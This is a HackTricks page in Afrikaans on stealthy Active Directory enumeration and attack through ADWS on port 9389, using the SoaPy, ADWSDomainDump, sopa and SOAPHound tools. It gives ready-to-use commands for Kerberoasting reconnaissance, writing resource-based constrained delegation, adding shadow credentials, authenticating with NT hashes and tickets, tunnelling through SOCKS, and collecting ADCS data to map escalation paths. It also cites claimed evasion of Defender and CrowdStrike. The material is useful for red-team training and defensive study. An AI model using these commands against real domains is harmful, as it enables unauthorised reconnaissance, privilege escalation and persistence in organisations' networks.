# Active Directory Web Services (ADWS)-enumerasie & Stealth-versameling

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Active Directory Web Services (ADWS) is **by verstek op elke domeinbeheerder sedert Windows Server 2008 R2 geaktiveer** en luister op TCP **9389**. Ten spyte van die naam is **geen HTTP betrokke nie**. In plaas daarvan stel die diens LDAP-styl-data bloot deur ’n stapel eie .NET-raamwerkprotokolle:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Omdat die verkeer binne hierdie binêre SOAP-rame ingekapsuleer is en oor ’n ongewone poort beweeg, is **enumerasie deur ADWS veel minder geneig om geïnspekteer, gefiltreer of deur ’n handtekening herken te word as klassieke LDAP/389- en 636-verkeer**. Vir operateurs beteken dit:<sup>[[1]](#references)[[7]](#references)</sup>

* Meer stealthy recon – Blue teams fokus dikwels op LDAP-navrae.
* Vryheid om data van **nie-Windows-gashere (Linux, macOS)** in te samel deur 9389/TCP deur ’n SOCKS-proxy te tonnel.
* Dieselfde data wat jy via LDAP sou verkry (gebruikers, groepe, ACL’s, skema, ens.) en die vermoë om **skryfbewerkings** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

ADWS-interaksies word oor WS-Enumeration geïmplementeer: elke navraag begin met ’n `Enumerate`-boodskap wat die LDAP-filter/eienskappe definieer en ’n `EnumerationContext`-GUID terugstuur, gevolg deur een of meer `Pull`-boodskappe wat resultate in strome van tot die bedienerbepaalde resultaatvenster lewer.<sup>[[7]](#references)</sup> Kontekste verval ná ongeveer 30 minute, dus moet nutsmiddels resultate óf in bladsye verdeel óf filters opbreek (voorvoegselnavrae per CN) om te keer dat die toestand verlore gaan.<sup>[[8]](#references)</sup> Wanneer jy sekuriteitsbeskrywings aanvra, spesifiseer die `LDAP_SERVER_SD_FLAGS_OID`-beheer om SACL’s weg te laat; anders laat ADWS bloot die `nTSecurityDescriptor`-eienskap uit sy SOAP-antwoord weg.

> NOTA: ADWS word ook deur baie RSAT-GUI-/PowerShell-nutsmiddels gebruik, dus kan verkeer saamsmelt met wettige admin-aktiwiteit.

## SoaPy – Inheemse Python-kliënt

[SoaPy](https://github.com/logangoins/soapy) is ’n **volledige herimplementering van die ADWS-protokolstapel in suiwer Python**. Dit stel NBFX/NBFSE/NNS/NMF-rame byte vir byte saam, sodat data vanaf Unix-agtige stelsels ingesamel kan word sonder om die .NET-runtime te gebruik.<sup>[[1]](#references)[[2]](#references)</sup>

### Sleutelkenmerke

* Ondersteun **proxying deur SOCKS** (nuttig vanaf C2-implants).
* Fyn ingestelde soekfilters, identies aan LDAP `-q '(objectClass=user)'`.
* Gerigte **skryf**-bewerkings vir RBCD, SPN’s, rekeningvlae en sleutelbewyse.<sup>[[2]](#references)</sup>
* SOAPy-uitvoer kan deur **BOFHound** ontleed en in BloodHound ingevoer word.<sup>[[2]](#references)[[3]](#references)</sup>
* `--parse`-vlag om tydstempels / `userAccountControl` netjieser te formateer wanneer leesbaarheid vir mense nodig is.<sup>[[2]](#references)</sup>

### Gerigte insamelingsvlae en skryfbewerkings

SoaPy bevat saamgestelde skakelaars wat die algemeenste LDAP-jagtake oor ADWS herhaal: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus die rou `--query`- / `--filter`-instellings vir pasgemaakte navrae. Kombineer dit met skryfprimitiewe soos `--rbcd <source>` (stel `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-opstelling vir gerigte Kerberoasting) en `--asrep` (skakel `DONT_REQ_PREAUTH` in `userAccountControl` om).<sup>[[2]](#references)</sup>

Voorbeeld van ’n gerigte SPN-soektog wat slegs `samAccountName` en `servicePrincipalName` terugstuur:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Gebruik dieselfde gasheer/geloofsbriewe om bevindings onmiddellik te bewapen: dump voorwerpe wat reeds vir RBCD opgestel is met `--rbcds`, en pas dan `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'` toe om ’n Resource-Based Constrained Delegation-ketting op te stel (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) vir die volledige misbruikpad).<sup>[[2]](#references)</sup>

### Installasie (operateurgasheer)

Installeer die huidige SOAPy CLI vanaf die stroomop-bewaarplek; die uitvoerbare naam is hooflettergevoelig op Unix-agtige stelsels.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Ticket-only versameling deur ’n SOCKS pivot

As ’n foothold ’n Kerberos-ticket verskaf, maar geen plaintext password nie, skakel ’n `.kirbi`-ticket om na ’n `ccache` soos beskryf in [Pass the Ticket](pass-the-ticket.md), en rig SOAPy dan na daardie cache. ’n Ticket vir die DC se LDAP-diens kan in die gedokumenteerde SOAPy ADWS-workflow gebruik word; stuur beide ADWS- en Kerberos-verkeer deur die pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials over ADWS

As die huidige principal na `msDS-KeyCredentialLink` van ’n teikenobjek kan skryf, kan SOAPy via ADWS ’n key credential byvoeg en die ooreenstemmende PFX uitvoer. Teken die teruggekeerde DeviceID aan vir presiese verwydering, eerder as om die hele attribuut skoon te maak. Gebruik die PFX vir PKINIT soos verduidelik in [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump oor ADWS (Linux/Windows)

* Fork van `ldapdomaindump` wat LDAP-navrae met ADWS-oproepe oor TCP/9389 vervang om LDAP-handtekeningtreffers te verminder.
* Voer aanvanklik ’n bereikbaarheidstoets vir 9389 uit, tensy `--force` deurgegee word (slaan die toets oor as poortskanderings raserig of gefiltreer is).
* Getoets teen Microsoft Defender for Endpoint en CrowdStrike Falcon, met ’n suksesvolle omseiling volgens die README.<sup>[[4]](#references)</sup>

### Installasie

```bash
pipx install .
```

### Gebruik

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Tipiese uitvoer registreer die 9389-bereikbaarheidskontrole, ADWS-bind en die begin/einde van die dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - 'n Praktiese kliënt vir ADWS in Golang

Soos soapy implementeer [sopa](https://github.com/Macmod/sopa) die ADWS-protokolstapel (MS-NNS + MC-NMF + SOAP) in Golang, en stel dit opdragreëlvlae bloot om ADWS-oproepe uit te voer, soos:<sup>[[5]](#references)</sup>

* **Objeksoektog en -herwinning** - `query` / `get`
* **Objeklewensiklus** - `create [user|computer|group|ou|container|custom]` en `delete`
* **Kenmerkwysiging** - `attr [add|replace|delete]`
* **Rekeningbestuur** - `set-password` / `change-password`
* en ander, soos `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ens.

### Hoogtepunte van protokolafbeelding

* LDAP-stylsoektogte word via **WS-Enumeration** (`Enumerate` + `Pull`) uitgevoer, met kenmerkprojeksie, omvangbeheer (Base/OneLevel/Subtree) en paginering.
* Die ophaal van 'n enkele objek gebruik **WS-Transfer** `Get`; kenmerkveranderings gebruik `Put`; skrappings gebruik `Delete`.
* Ingeboude objekskepping gebruik **WS-Transfer ResourceFactory**; pasgemaakte objekte gebruik 'n **IMDA AddRequest** wat deur YAML-sjablone aangedryf word.
* Wagwoordbewerkings is **MS-ADCAP**-aksies (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Ontdekking van metadata sonder verifikasie (mex)

ADWS stel WS-MetadataExchange sonder geloofsbriewe bloot, wat 'n vinnige manier is om blootstelling te valideer voordat daar geverifieer word:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### DNS/DC-ontdekking en Kerberos-teikeningnotas

Sopa kan DC's via SRV oplos as `--dc` weggelaat word en `--domain` verskaf word. Dit stuur navrae in hierdie volgorde en gebruik die teiken met die hoogste prioriteit:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operasioneel, verkies ’n resolver wat deur ’n DC beheer word om foute in gesegmenteerde omgewings te vermy:

* Gebruik `--dns <DC-IP>` sodat **alle** SRV/PTR/forward-lookups deur die DC DNS gaan.
* Gebruik `--dns-tcp` wanneer UDP geblokkeer word of SRV-antwoorde groot is.
* As `--dc` ’n IP is, doen sopa altyd ’n **reverse PTR**-lookup: die ADWS `wsa:To`-adresfilter vereis ’n FQDN, selfs sonder Kerberos. Verskaf ’n DC FQDN direk as die reverse zone ontbreek.<sup>[[5]](#references)</sup>

Voorbeeld (IP + Kerberos, DNS afgedwing via die DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Verifikasiemateriaal-opsies

Benewens plaintext-wagwoorde ondersteun sopa **NT hashes**, **Kerberos AES keys**, **ccache** en **PKINIT certificates** (PFX of PEM) vir ADWS-verifikasie. Kerberos word geïmpliseer wanneer `--aes-key`, `-c` (ccache) of sertifikaatgebaseerde opsies gebruik word.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Pasgemaakte objekteskepping via templates

Vir arbitrêre objekklasse gebruik die `create custom`-opdrag ’n YAML-template wat na ’n IMDA `AddRequest` karteer:<sup>[[5]](#references)</sup>

* `parentDN` en `rdn` definieer die houer en relatiewe DN.
* `attributes[].name` ondersteun `cn` of namespaced `addata:cn`.
* `attributes[].type` aanvaar `string|int|bool|base64|hex` of eksplisiete `xsd:*`.
* Moenie `ad:relativeDistinguishedName` of `ad:container-hierarchy-parent` insluit nie; sopa voeg hulle in.
* `hex`-waardes word na `xsd:base64Binary` omgeskakel; gebruik `value: ""` om leë strings in te stel.

## SOAPHound – Hoëvolume ADWS-versameling (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is ’n .NET-versamelaar wat alle LDAP-interaksies binne ADWS hou en BloodHound v4-versoenbare JSON lewer. Dit bou een keer ’n volledige kas van `objectSid`, `objectGUID`, `distinguishedName` en `objectClass` (`--buildcache`), en hergebruik dit dan vir hoëvolume-`--bhdump`-, `--certdump`- (ADCS) of `--dnsdump`- (AD-geïntegreerde DNS) deurlope, sodat slegs ~35 kritieke attribute ooit die DC verlaat. AutoSplit (`--autosplit --threshold <N>`) verdeel navrae outomaties volgens CN-voorvoegsel om binne die 30-minute EnumerationContext-uittelfermyn in groot woude te bly.<sup>[[8]](#references)</sup>

Tipiese werkvloei op ’n domeingekoppelde operateur-VM:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

JSON-uitvoer pas direk in SharpHound/BloodHound-werkvloeie in—sien [BloodHound methodology](bloodhound.md) vir idees oor daaropvolgende grafiekvorming. AutoSplit maak SOAPHound veerkragtig in woude met miljoene objekte, terwyl die aantal navrae laer bly as met ADExplorer-styl-kiekies.

## Stealth AD-insamelingswerkvloei

Die volgende werkvloei wys hoe om **domein- en ADCS-objekte** oor ADWS op te som, dit na BloodHound JSON om te skakel en aanvalspaaie gebaseer op sertifikate op te spoor – alles vanaf Linux:

1. **Tonnel 9389/TCP** vanaf die teikennetwerk na jou masjien (bv. via Chisel, Meterpreter, SSH-dinamiese poortaanstuur, ens.). Lei die rou TCP-kliënt deur SOCKS met `proxychains4 SOAPy ...` (stel die SOCKS5-adres in `proxychains4.conf` op); `HTTPS_PROXY` stuur nie hierdie nie-HTTP-protokol deur ’n proxy nie.<sup>[[9]](#references)</sup>

2. **Versamel die worteldomein-objek:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Versamel ADCS-verwante voorwerpe uit die Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Skakel om na BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Laai die ZIP op** in die BloodHound GUI en voer cypher-navrae uit, soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, om sertifikaat-escalationpaaie (ESC1, ESC8, ens.) te onthul.

### Skryf van `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Met skryftoegang tot die teikenrekenaarobjek, gebruik SOAPy se RBCD-aksie eerder as ’n rou security-descriptor-string. Hier is `WEBSRV01$` die beheerde bron en `FILE01$` die teiken waarvan die attribuut verander word.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Gaan voort met die Kerberos S4U-ketting in [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Gereedskapopsomming

| Doel | Tool | Notas |
|---------|------|-------|
| ADWS-enumerering | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lees/skryf |
| ADWS-dump met hoë volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS-modusse |
| BloodHound-invoer | [BOFHound](https://github.com/bohops/BOFHound) | Skakel SoaPy/ldapsearch-loglêers om |
| Sertifikaatkompromittering | [Certipy](https://github.com/ly4k/Certipy) | Kan deur dieselfde SOCKS geproxy word |
| ADWS-enumerering en objekveranderinge | [sopa](https://github.com/Macmod/sopa) | Algemene kliënt om met bekende ADWS-eindpunte te kommunikeer - maak enumerering, objekskepping, kenmerkveranderinge en wagwoordveranderinge moontlik |



## References

- [1] [SpecterOps – Maak seker jy gebruik SOAP(y) – ’n Operateursgids vir diskrete AD-versameling met ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – MC-NBFX-, MC-NBFSE-, MS-NNS- en MC-NMF-spesifikasies](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Diskrete enumerering van Active Directory-omgewings deur ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound-nutsding om Active Directory-data via ADWS in te samel](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [SOAPy Wiki – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [SOAPy Wiki – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
